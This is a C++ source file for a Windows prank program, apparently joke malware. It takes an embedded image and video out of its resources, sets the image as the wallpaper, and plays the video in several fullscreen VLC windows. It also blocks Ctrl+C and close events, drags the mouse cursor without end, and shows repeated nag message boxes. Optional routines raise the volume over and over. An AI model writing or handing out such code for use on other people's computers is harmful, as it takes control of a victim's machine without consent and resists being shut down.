#include <windows.h>
#include <shellapi.h>
#include <fstream>
#include <string>
#include <thread>
#include "resources.h"

std::wstring getExeFolder() {
    wchar_t exePath[MAX_PATH];
    GetModuleFileNameW(NULL, exePath, MAX_PATH);
    std::wstring path(exePath);
    size_t pos = path.find_last_of(L"\\");
    return path.substr(0, pos);
}

bool saveResourceToFile(WORD resID, const wchar_t* type, const std::wstring& outPath) {
    HRSRC hResource = FindResourceW(NULL, MAKEINTRESOURCEW(resID), RT_RCDATA);
    /* if (!hResource) {
        MessageBoxW(NULL, L"Failed to find the resource", L"Error", MB_OK | MB_ICONERROR); // for debugging
        return false;
    } */

    DWORD dwSize = SizeofResource(NULL, hResource);
    /* if (dwSize == 0) {
        MessageBoxW(NULL, L"Resource size is 0", L"Error", MB_OK | MB_ICONERROR);
        return false;
    } */

    HGLOBAL hLoadedResource = LoadResource(NULL, hResource);
    /* if (!hLoadedResource) {
        MessageBoxW(NULL, L"Failed to load resource", L"Error", MB_OK | MB_ICONERROR);
        return false;
    } */

    void* pResourceData = LockResource(hLoadedResource);
    /* if (!pResourceData) {
        MessageBoxW(NULL, L"Failed to lock resource", L"Error", MB_OK | MB_ICONERROR);
        return false;
    } */

    std::ofstream out(outPath, std::ios::binary);
    /* if (!out) {
        MessageBoxW(NULL, L"Failed to open output file", L"Error", MB_OK | MB_ICONERROR);
        return false;
    } */

    out.write(reinterpret_cast<char*>(pResourceData), dwSize);
    out.close();

    return true;
}

void setWallpaper(const std::wstring& imgPath) {
    SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (PVOID)imgPath.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
}

BOOL WINAPI ConsoleHandler(DWORD type) {
    return TRUE; // Block Ctrl+C and close events
}

void spamMessages() {
    for (int i = 0; i < 5; ++i)
        MessageBoxW(NULL, L"Why are you closing me?", L"Hey!", MB_OK | MB_ICONEXCLAMATION);
}

void moveMouse() {
    while (true) {
        POINT p;
        GetCursorPos(&p);
        SetCursorPos(p.x + 10, p.y + 10);
        Sleep(500);
    }
}

void maxVolumeFast() {
    for (int i = 0; i < 20; ++i) {
        keybd_event(VK_VOLUME_UP, 0, 0, 0);
        keybd_event(VK_VOLUME_UP, 0, KEYEVENTF_KEYUP, 0);
        Sleep(10);
    }
}

void annoyVolume() { // keeps turning up the volume for ever
    while (true) {
        for (int i = 0; i < 50; ++i) {
            keybd_event(VK_VOLUME_UP, 0, 0, 0);
            keybd_event(VK_VOLUME_UP, 0, KEYEVENTF_KEYUP, 0);
        }
        Sleep(1000);
    }
}


int main() {
    
    SetConsoleCtrlHandler(ConsoleHandler, TRUE);
    std::thread mouseThread(moveMouse);
    std::thread msgThread(spamMessages);

    std::wstring exeFolder = getExeFolder();
    std::wstring imgPath = exeFolder + L"\\stiv.jpg";
    std::wstring vidPath = exeFolder + L"\\ciken.mp4";

    // Extract resources and save them in the exe folder
    if (!saveResourceToFile(IDB_IMAGE, RT_RCDATA, imgPath)) {
        MessageBoxW(NULL, L"Failed to extract image", L"Error", MB_OK | MB_ICONERROR); // remove dis messagebox box
        return 1;
    }

    if (!saveResourceToFile(IDB_VIDEO, RT_RCDATA, vidPath)) {
        MessageBoxW(NULL, L"Failed to extract video", L"Error", MB_OK | MB_ICONERROR);
        return 1;
    }

    setWallpaper(imgPath);

    // maxVolumeFast();
    // annoyVolume(); // pick this one

    for (int i = 0; i < 5; ++i) {

        // std::wstring videoUri = L"ms-photos:video=" + vidPath;  // This will open the video with the Photos app, max 1 video at the time
        // ShellExecuteW(NULL, L"open", videoUri.c_str(), NULL, NULL, SW_SHOWNORMAL);
        
        // ShellExecuteW(NULL, L"open", L"wmplayer.exe", vidPath.c_str(), NULL, SW_SHOWNORMAL); // opens with windows media player, max 1 window at the time
        
        // ShellExecuteW(NULL, L"open", vidPath.c_str(), NULL, NULL, SW_SHOWNORMAL); // default player, usually Foto/Video, the blue one, max 1 video at the time

        std::wstring params = L"\"" + vidPath + L"\" --fullscreen";
        ShellExecuteW(NULL, L"open", L"C:\\Program Files\\VideoLAN\\VLC\\vlc.exe", params.c_str(), NULL, SW_SHOWNORMAL);
        // opens vlc, multiple videos at the time

        Sleep(1000);
    }

    msgThread.join();
    mouseThread.join();

    return 0;
}
